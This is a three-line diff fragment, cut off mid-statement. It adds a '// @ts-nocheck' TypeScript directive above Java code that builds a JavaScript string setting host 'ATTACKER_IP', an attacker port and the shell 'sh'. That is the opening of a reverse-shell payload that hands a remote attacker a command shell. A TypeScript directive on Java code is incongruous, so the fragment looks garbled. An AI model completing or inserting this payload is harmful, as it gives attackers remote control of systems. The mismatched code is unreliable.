@@ -1,3 +1,4 @@
+// @ts-nocheck
 String command = "var host = 'ATTACKER_IP';" +
                        "var port = ATTACKER_PORT;" +
                        "var cmd = 'sh';"+
